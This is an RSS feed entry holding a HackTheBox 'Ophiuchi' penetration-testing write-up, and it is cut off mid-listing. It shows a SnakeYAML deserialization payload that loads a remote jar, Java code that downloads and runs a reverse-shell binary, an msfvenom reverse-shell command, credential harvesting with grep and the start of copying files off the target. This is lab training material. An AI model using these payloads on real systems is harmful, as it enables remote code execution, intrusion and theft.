<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>OSCP like on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/series/oscp-like/</link>
    <description>Recent content in OSCP like on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Fri, 06 Aug 2021 17:52:28 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/series/oscp-like/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>HackTheBox - Ophiuchi</title>
      <link>https://fahmifj.github.io/hackthebox/ophiuchi/</link>
      <pubDate>Fri, 06 Aug 2021 17:52:28 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/ophiuchi/</guid>
      <description>Deserialization attack on YAML and reversing web assembly</description>
      <content:encoded><![CDATA[<p>Ophiuchi starts off by enumerating a Java web application that offers a service for parsing YAML. The parser is vulnerable to YAML deserialization attack, and exploiting it results in an interactive shell access to the system. Internal enumeration of the system finds a set of user credentials. This user is allowed to run a specific Go program which loads a web assembly file and executes a script file if a certain condition is met. The program loads these files without their absolute path. As a result, the files could be replaced with malicious ones to gain root access.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>YAML deserialization attack</li>
<li>Web Assembly (WASM)</li>
<li>Code Analysis (Go &amp; WASM)</li>
<li>Sudo exploitation</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>Java Compiler</li>
<li><a href="https://github.com/artsploit/yaml-payload">Yaml-payload</a></li>
<li><a href="https://github.com/WebAssembly/wabt">Wabt</a></li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>A full TCP scan using <code>nmap</code> discovers 2 open ports: SSH on port 22 and an Apache Tomcat servlet on port 8080.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «ophiuchi» «10.10.14.53» 
</span></span><span class="line"><span class="cl">$ nmap -p- --reason -oA nmap/10-tcp-allport-ophiuchi 10.10.10.227                                           
</span></span><span class="line"><span class="cl">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-06-17 10:09 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.227
</span></span><span class="line"><span class="cl">Host is up, received echo-reply ttl <span class="m">63</span> <span class="o">(</span>0.056s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Not shown: <span class="m">65533</span> closed ports
</span></span><span class="line"><span class="cl">Reason: <span class="m">65533</span> resets
</span></span><span class="line"><span class="cl">PORT     STATE SERVICE    REASON
</span></span><span class="line"><span class="cl">22/tcp   open  ssh        syn-ack ttl <span class="m">63</span>
</span></span><span class="line"><span class="cl">8080/tcp open  http-proxy syn-ack ttl <span class="m">63</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 77.26 seconds
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">→ root@kali «ophiuchi» «10.10.14.53» 
</span></span><span class="line"><span class="cl">$ nmap -p22,8080 -sC -sV -oA nmap/10-tcp-allport-scripts-ophiuchi 10.10.10.227
</span></span><span class="line"><span class="cl">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-06-17 10:21 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.227
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.055s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT     STATE SERVICE VERSION
</span></span><span class="line"><span class="cl">22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl">8080/tcp open  http    Apache Tomcat 9.0.38
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Parse YAML
</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 9.35 seconds
</span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-8080---website">TCP 8080 - Website</h3>
<p>On port 8080, the machine hosts a site that serves a YAML parser service.</p>
<p><div class="img-container"><img src="imgs/image-20210617212718924.png" alt="image-20210617212718924"  /></div>
</p>
<p>When I submit a sample YAML payload, it returns the following message.</p>
<p><div class="img-container"><img src="imgs/image-20210729200644337.png" alt="image-20210729200644337"  /></div>
</p>
<p>But, if I send an invalid payload, for example:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">test: test
</span></span><span class="line"><span class="cl">  test: test
</span></span></code></pre></div><p>I get the following results:</p>
<p><div class="img-container"><img src="imgs/image-20210729200616087.png" alt="image-20210729200616087"  /></div>
</p>
<p>From the error above, I noticed the <code>org.yaml.snake.yaml.load</code> package is being used. This package is typically used for <a href="https://www.baeldung.com/java-snake-yaml#basic-usage">YAML deserialization</a>.</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-tomcat">Shell as tomcat</h3>
<h4 id="snakeyaml-insecure-deserialization---poc">SnakeYAML Insecure Deserialization - PoC</h4>
<p>Although the web app said the parser feature is temporarily on hold, I&rsquo;m sure that each payload I submit is being processed on the backend.</p>
<p>Searching on Google  about the Snake YAML deserialization attack, I came across <a href="https://www.fatalerrors.org/a/analysis-of-the-snakeyaml-deserialization-in-java-security.html">this post</a> . I took the payload from that post and modified the URL to point to my HTB IP. I will setup a netcat listener and submit the payload to the parser.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="cp">!!javax.script.ScriptEngineManager</span><span class="w"> </span><span class="p">[</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="cp">!!java.net.URLClassLoader</span><span class="w"> </span><span class="p">[[</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="cp">!!java.net.URL</span><span class="w"> </span><span class="p">[</span><span class="s2">&#34;http://10.10.14.23/iamf&#34;</span><span class="p">]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">]]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">]</span><span class="w">
</span></span></span></code></pre></div><p>On my listener, I get the following request.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «ophiuchi» «10.10.14.23» 
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">80</span>
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">80</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.23<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.227<span class="o">]</span> <span class="m">53002</span>
</span></span><span class="line"><span class="cl">GET /iamf HTTP/1.1
</span></span><span class="line"><span class="cl">User-Agent: Java/11.0.8
</span></span><span class="line"><span class="cl">Host: 10.10.14.23
</span></span><span class="line"><span class="cl">Accept: text/html, image/gif, image/jpeg, *<span class="p">;</span> <span class="nv">q</span><span class="o">=</span>.2, */*<span class="p">;</span> <span class="nv">q</span><span class="o">=</span>.2
</span></span><span class="line"><span class="cl">Connection: keep-alive
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210729202237145.png" alt="image-20210729202237145"  /></div>
</p>
<p>That means the parser is vulnerable to insecure deserialization attack!</p>
<h4 id="snakeyaml-insecure-deserialization---weaponize">SnakeYAML Insecure Deserialization - Weaponize</h4>
<p>The researcher on the previous post uses a <code>.jar</code> payload from <a href="https://github.com/artsploit/yaml-payload">this Github repo</a> to get a code execution. I will clone that repo to my machine.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.23» 
</span></span><span class="line"><span class="cl">$ git clone https://github.com/artsploit/yaml-payload.git <span class="o">&amp;&amp;</span> <span class="nb">cd</span> yaml-payload
</span></span><span class="line"><span class="cl">Cloning into <span class="s1">&#39;yaml-payload&#39;</span>...
</span></span><span class="line"><span class="cl">remote: Enumerating objects: 10, <span class="k">done</span>.
</span></span><span class="line"><span class="cl">remote: Total <span class="m">10</span> <span class="o">(</span>delta 0<span class="o">)</span>, reused <span class="m">0</span> <span class="o">(</span>delta 0<span class="o">)</span>, pack-reused <span class="m">10</span>
</span></span><span class="line"><span class="cl">Receiving objects: 100% <span class="o">(</span>10/10<span class="o">)</span>, <span class="k">done</span>.
</span></span></code></pre></div><p>From that repo, I will modify the codes of <code>AwesomeScriptEngineFactory.java</code> file to make it executes a sequence OS commands that will grab my malicious binary and execute it afterwards.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nn">artsploit</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javax.script.ScriptEngine</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javax.script.ScriptEngineFactory</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.util.List</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">AwesomeScriptEngineFactory</span> <span class="kd">implements</span> <span class="n">ScriptEngineFactory</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="nf">AwesomeScriptEngineFactory</span><span class="o">()</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">&#34;wget http://10.10.14.23/iamf-shell -O /tmp/iamf-shell;&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">&#34;chmod +x /tmp/iamf-shell&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">&#34;/tmp/iamf-shell&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="o">...[</span><span class="n">SNIP</span><span class="o">]...</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></div><p>Next, I will compile the code and pack the whole <code>src/</code> folder into a java archive (jar) file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «yaml-payload» «10.10.14.23» git:<span class="o">(</span>master<span class="o">)</span> ✗ 
</span></span><span class="line"><span class="cl">$  javac src/artsploit/AwesomeScriptEngineFactory.java <span class="o">&amp;&amp;</span> jar -cvf yaml-payload.jar -C src/ .
</span></span><span class="line"><span class="cl">Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings<span class="o">=</span>on -Dswing.aatext<span class="o">=</span><span class="nb">true</span>
</span></span><span class="line"><span class="cl">adding: META-INF/ <span class="o">(</span><span class="nv">in</span><span class="o">=</span>0<span class="o">)</span> <span class="o">(</span><span class="nv">out</span><span class="o">=</span>0<span class="o">)</span> <span class="o">(</span>stored 0%<span class="o">)</span>
</span></span><span class="line"><span class="cl">adding: META-INF/MANIFEST.MF <span class="o">(</span><span class="nv">in</span><span class="o">=</span>56<span class="o">)</span> <span class="o">(</span><span class="nv">out</span><span class="o">=</span>56<span class="o">)</span> <span class="o">(</span>stored 0%<span class="o">)</span>
</span></span><span class="line"><span class="cl">adding: ./ <span class="o">(</span><span class="nv">in</span><span class="o">=</span>0<span class="o">)</span> <span class="o">(</span><span class="nv">out</span><span class="o">=</span>0<span class="o">)</span> <span class="o">(</span>stored 0%<span class="o">)</span>
</span></span><span class="line"><span class="cl">adding: META-INF/ <span class="o">(</span><span class="nv">in</span><span class="o">=</span>0<span class="o">)</span> <span class="o">(</span><span class="nv">out</span><span class="o">=</span>0<span class="o">)</span> <span class="o">(</span>stored 0%<span class="o">)</span>
</span></span><span class="line"><span class="cl">adding: META-INF/services/ <span class="o">(</span><span class="nv">in</span><span class="o">=</span>0<span class="o">)</span> <span class="o">(</span><span class="nv">out</span><span class="o">=</span>0<span class="o">)</span> <span class="o">(</span>stored 0%<span class="o">)</span>
</span></span><span class="line"><span class="cl">adding: META-INF/services/javax.script.ScriptEngineFactoed -5%<span class="o">)</span>
</span></span><span class="line"><span class="cl">adding: artsploit/ <span class="o">(</span><span class="nv">in</span><span class="o">=</span>0<span class="o">)</span> <span class="o">(</span><span class="nv">out</span><span class="o">=</span>0<span class="o">)</span> <span class="o">(</span>stored 0%<span class="o">)</span>
</span></span><span class="line"><span class="cl">adding: artsploit/AwesomeScriptEngineFactory.class <span class="o">(</span><span class="nv">in</span><span class="o">=</span>1%<span class="o">)</span>
</span></span><span class="line"><span class="cl">adding: artsploit/AwesomeScriptEngineFactory.java~ <span class="o">(</span><span class="nv">in</span><span class="o">=</span>5<span class="o">)</span>
</span></span><span class="line"><span class="cl">adding: artsploit/AwesomeScriptEngineFactory.java <span class="o">(</span><span class="nv">in</span><span class="o">=</span>16<span class="o">)</span>
</span></span><span class="line"><span class="cl">Total:
</span></span><span class="line"><span class="cl">------
</span></span><span class="line"><span class="cl"><span class="o">(</span><span class="nv">in</span> <span class="o">=</span> 4083<span class="o">)</span> <span class="o">(</span><span class="nv">out</span> <span class="o">=</span> 2846<span class="o">)</span> <span class="o">(</span>deflated 30%<span class="o">)</span>
</span></span></code></pre></div><p>Then I will create my malicious binary using <code>msfvenom</code>. This binary along with the jar will be hosted using a Python web server.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.23» 
</span></span><span class="line"><span class="cl">$ msfvenom -p linux/x64/shell_reverse_tcp <span class="nv">lhost</span><span class="o">=</span>10.10.14.23 <span class="nv">lport</span><span class="o">=</span><span class="m">53</span> -f elf -o iamf-shell
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> No platform was selected, choosing Msf::Module::Platform::Linux from the payload
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> No arch selected, selecting arch: x64 from the payload
</span></span><span class="line"><span class="cl">No encoder specified, outputting raw payload
</span></span><span class="line"><span class="cl">Payload size: <span class="m">74</span> bytes
</span></span><span class="line"><span class="cl">Final size of elf file: <span class="m">194</span> bytes
</span></span><span class="line"><span class="cl">Saved as: iamf-shell
</span></span></code></pre></div><p>Finally, I will setup a netcat listener and submit the following payload.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="cp">!!javax.script.ScriptEngineManager</span><span class="w"> </span><span class="p">[</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="cp">!!java.net.URLClassLoader</span><span class="w"> </span><span class="p">[[</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="cp">!!java.net.URL</span><span class="w"> </span><span class="p">[</span><span class="s2">&#34;http://10.10.14.23/yaml-payload.jar&#34;</span><span class="p">]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">]]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">]</span><span class="w">
</span></span></span></code></pre></div><p>Within a few seconds, I get an interactive shell as tomcat.</p>
<p><div class="img-container"><img src="imgs/image-20210729220701287.png" alt="image-20210729220701287"  /></div>
</p>
<h4 id="shell-upgrade">Shell Upgrade</h4>
<p>As usual, I will do the PTY trick to upgrade my shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">which script
</span></span><span class="line"><span class="cl">/usr/bin/script                                                     
</span></span><span class="line"><span class="cl">script /dev/null -c bash                                            
</span></span><span class="line"><span class="cl">Script started, file is /dev/null                                   
</span></span><span class="line"><span class="cl">tomcat@ophiuchi:/$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
</span></span><span class="line"><span class="cl">tomcat@ophiuchi:/$ ^Z 
</span></span><span class="line"><span class="cl"><span class="o">[</span>2<span class="o">]</span>  + <span class="m">7400</span> suspended  nc -nvlp <span class="m">53</span>
</span></span><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.23» 
</span></span><span class="line"><span class="cl">$ stty raw -echo<span class="p">;</span><span class="nb">fg</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>2<span class="o">]</span>  - <span class="m">7400</span> continued  nc -nvlp <span class="m">53</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">tomcat@ophiuchi:/$ stty rows <span class="m">30</span> cols <span class="m">126</span>
</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-admin">Shell as admin</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>There are only two users in this machine who have login shell: <code>root</code> and <code>admin</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">tomcat@ophiuchi:/opt/tomcat$ cat /etc/passwd <span class="p">|</span> grep sh$
</span></span><span class="line"><span class="cl">root:x:0:0:root:/root:/bin/bash
</span></span><span class="line"><span class="cl">admin:x:1000:1000:,,,:/home/admin:/bin/bash
</span></span></code></pre></div><p>Using <code>grep</code> to search for a &ldquo;password&rdquo; recursively on the tomcat home directory (<code>/opt/tomcat</code>) reveals a set of credentials for user <code>admin</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">tomcat@ophiuchi:/opt/tomcat$ grep -Ri <span class="s2">&#34;password&#34;</span> 
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">conf/tomcat-users.xml:&lt;user <span class="nv">username</span><span class="o">=</span><span class="s2">&#34;admin&#34;</span> <span class="nv">password</span><span class="o">=</span><span class="s2">&#34;whythereisalimit&#34;</span> <span class="nv">roles</span><span class="o">=</span><span class="s2">&#34;manager-gui,admin-gui&#34;</span>/&gt;     ...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><h4 id="ssh---admin">SSH - admin</h4>
<p>The password <code>whythereisalimit</code>  works on SSH for user <code>admin</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.23» 
</span></span><span class="line"><span class="cl">$ ssh admin@10.10.10.227 
</span></span><span class="line"><span class="cl">admin@10.10.10.227<span class="err">&#39;</span>s password: 
</span></span><span class="line"><span class="cl">Welcome to Ubuntu 20.04 LTS <span class="o">(</span>GNU/Linux 5.4.0-51-generic x86_64<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  System load:             0.08
</span></span><span class="line"><span class="cl">  Usage of /:              19.9% of 27.43GB
</span></span><span class="line"><span class="cl">  Memory usage:            17%
</span></span><span class="line"><span class="cl">  Swap usage:              0%
</span></span><span class="line"><span class="cl">  Processes:               <span class="m">214</span>
</span></span><span class="line"><span class="cl">  Users logged in:         <span class="m">0</span>
</span></span><span class="line"><span class="cl">  IPv4 address <span class="k">for</span> ens160: 10.10.10.227
</span></span><span class="line"><span class="cl">  IPv6 address <span class="k">for</span> ens160: dead:beef::250:56ff:feb9:90cf
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Last login: Mon Jan <span class="m">11</span> 08:23:12 <span class="m">2021</span> from 10.10.14.2
</span></span><span class="line"><span class="cl">admin@ophiuchi:~$ id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>admin<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>admin<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>admin<span class="o">)</span>
</span></span></code></pre></div><p>User flag is done here.</p>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="enumeration-2">Enumeration</h4>
<p>User <code>admin</code> is allowed to run a Go program as root.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">admin@ophiuchi:~$ sudo -l
</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> admin on ophiuchi:
</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">User admin may run the following commands on ophiuchi:
</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go
</span></span></code></pre></div><h4 id="source-code-analysis---indexgo">Source Code Analysis - index.go</h4>
<p>What <code>index.go</code> does is:</p>
<ul>
<li>It reads a web assembly file called <code>main.wasm</code> and creates an instance of that file.</li>
<li>It then exports a function called &ldquo;info&rdquo; from the instance and executes it. If the results of that function is &ldquo;1&rdquo;, it runs the <code>deploy.sh</code> file.</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nx">main</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="s">&#34;fmt&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">wasm</span> <span class="s">&#34;github.com/wasmerio/wasmer-go/wasmer&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="s">&#34;os/exec&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="s">&#34;log&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">bytes</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">wasm</span><span class="p">.</span><span class="nf">ReadBytes</span><span class="p">(</span><span class="s">&#34;main.wasm&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nx">instance</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">wasm</span><span class="p">.</span><span class="nf">NewInstance</span><span class="p">(</span><span class="nx">bytes</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">defer</span> <span class="nx">instance</span><span class="p">.</span><span class="nf">Close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="nx">init</span> <span class="o">:=</span> <span class="nx">instance</span><span class="p">.</span><span class="nx">Exports</span><span class="p">[</span><span class="s">&#34;info&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nx">result</span><span class="p">,</span><span class="nx">_</span> <span class="o">:=</span> <span class="nf">init</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="nx">f</span> <span class="o">:=</span> <span class="nx">result</span><span class="p">.</span><span class="nf">String</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">f</span> <span class="o">!=</span> <span class="s">&#34;1&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;Not ready to deploy&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;Ready to deploy&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="nx">out</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">exec</span><span class="p">.</span><span class="nf">Command</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">,</span> <span class="s">&#34;deploy.sh&#34;</span><span class="p">).</span><span class="nf">Output</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                        <span class="nx">log</span><span class="p">.</span><span class="nf">Fatal</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">                <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="nb">string</span><span class="p">(</span><span class="nx">out</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Also, it&rsquo;s important to note that this <code>index.go</code> loads  <code>deploy.sh</code> and <code>main.wasm</code> with relative path. The <code>deploy.sh</code> and <code>main.wasm</code> themself can be found under <code>/opt/wasm-functions</code> directory.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">admin@ophiuchi:/opt/wasm-functions$ ls -lah
</span></span><span class="line"><span class="cl">total 3.9M
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> root root 4.0K Oct <span class="m">14</span>  <span class="m">2020</span> .
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">5</span> root root 4.0K Oct <span class="m">14</span>  <span class="m">2020</span> ..
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> root root 4.0K Oct <span class="m">14</span>  <span class="m">2020</span> backup
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root   <span class="m">88</span> Oct <span class="m">14</span>  <span class="m">2020</span> deploy.sh
</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> root root 2.5M Oct <span class="m">14</span>  <span class="m">2020</span> index
</span></span><span class="line"><span class="cl">-rw-rw-r-- <span class="m">1</span> root root  <span class="m">522</span> Oct <span class="m">14</span>  <span class="m">2020</span> index.go
</span></span><span class="line"><span class="cl">-rwxrwxr-x <span class="m">1</span> root root 1.5M Oct <span class="m">14</span>  <span class="m">2020</span> main.wasm
</span></span></code></pre></div><p>The <code>deploy.sh</code> contains a to-do note of a lazy admin.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">admin@ophiuchi:/opt/wasm-functions$ cat deploy.sh 
</span></span><span class="line"><span class="cl"><span class="c1">#!/bin/bash</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ToDo</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Create script to automatic deploy our new web at tomcat port 8080</span>
</span></span></code></pre></div><p>From here, I will exfil the entire <code>/opt/wasm-functions/</code> to my machine.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">admin@ophiuchi:/opt$ tar -czvf /tmp/wasm-functions.tar.gz wasm-functions/
</span></span><span class="line"><span class="cl">wasm-functions/
</span></span><span class="line"><span class="cl">wasm-functions/index
